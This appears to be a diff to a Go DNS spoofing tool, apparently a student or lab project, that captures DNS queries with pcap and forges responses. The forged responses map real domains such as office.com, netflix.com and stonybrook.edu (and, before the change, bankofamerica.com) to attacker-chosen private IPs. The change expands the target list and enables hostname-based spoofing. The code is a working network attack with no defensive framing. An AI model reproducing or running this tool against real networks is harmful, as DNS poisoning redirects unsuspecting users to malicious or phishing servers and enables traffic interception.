@@ -41,16 +41,23 @@ type DnsMsg struct {
 }
 
 func populateHostName() {
-	hostnames["bankofamerica.com$"] = "192.168.145.128"
-	hostnames["youtube.com$"] = "10.0.0.1"
-	hostnames["python.org$"] = "10.12.33.1"
-	hostnames["yahoo.com$"] = "10.3.2.1"
+	hostnames = make(map[string]string)
+	hostnames["imdb.com"] = "192.168.100.4"
+	hostnames["blackboard.com"] = "10.0.0.1"
+	hostnames["spotify.org"] = "10.12.33.1"
+	hostnames["whatsapp.com"] = "10.3.2.1"
+	hostnames["stonybrook.edu"] = "10.3.2.2"
+	hostnames["office.com"] = "10.3.2.3"
+	hostnames["netflix.com"] = "10.3.2.4"
+	hostnames["spotify.com"] = "10.3.2.5"
+	hostnames["myshopify.com"] = "10.3.2.6"
+	hostnames["wikipedia.org"] = "10.3.2.7"
 }
 
 func getSpoofedIP(s string) (string, bool) {
 	for key, value := range hostnames {
 		matched, _ := regexp.MatchString(key, s)
-
+		fmt.Println(key, "-> ", value, s)
 		if matched {
 			return value, true
 		}
@@ -185,7 +192,6 @@ func processPackets(isHostFile bool) {
 				ethLayer.DstMAC = ethMac
 
 			case layers.LayerTypeDNS:
-
 				// set this to be a response
 				dnsLayer.QR = true
 
@@ -211,14 +217,14 @@ func processPackets(isHostFile bool) {
 
 					// spoofedIP, isMatched = hostnames[string(qDNS.Name)]
 
-					isMatched = true
-					spoofedIP = getIFaceIP(device).String()
+					// isMatched = true
+					// spoofedIP = getIFaceIP(device).String()
 
-					if isHostFile {
+					// if isHostFile {
 						spoofedIP, isMatched = getSpoofedIP(string(qDNS.Name))
-
+						fmt.Println(spoofedIP)
 						aDNS.IP = net.ParseIP(spoofedIP)
-					}
+					// }
 
 					if isMatched {
 						fmt.Println("\nNAME: ", string(qDNS.Name))
@@ -267,6 +273,8 @@ func main() {
 	devices, err := pcap.FindAllDevs()
 
 	device = devices[0].Name
+
+	populateHostName()
 
 	var filter string = "udp port 53"
 
